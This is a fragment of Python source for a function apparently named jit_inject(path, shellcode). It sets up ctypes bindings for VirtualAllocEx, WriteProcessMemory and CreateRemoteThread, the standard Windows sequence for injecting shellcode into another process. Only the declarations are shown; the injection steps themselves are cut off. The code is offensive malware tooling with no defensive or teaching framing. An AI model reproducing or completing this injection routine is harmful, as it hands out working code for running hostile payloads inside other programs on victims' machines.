...
def jit_inject(path, shellcode):
    ...
    virtual_alloc_ex.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD)

    write_process_memory = ctypes.windll.kernel32.WriteProcessMemory
    write_process_memory.restype = wintypes.BOOL
    write_process_memory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, wintypes.DWORD, wintypes.DWORD)

    create_remote_thread = ctypes.windll.kernel32.CreateRemoteThread
    create_remote_thread.restype = wintypes.HANDLE
    create_remote_thread.argtypes = (
    wintypes.HANDLE, LPSECURITY_ATTRIBUTES, wintypes.DWORD, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD,
    wintypes.DWORD)
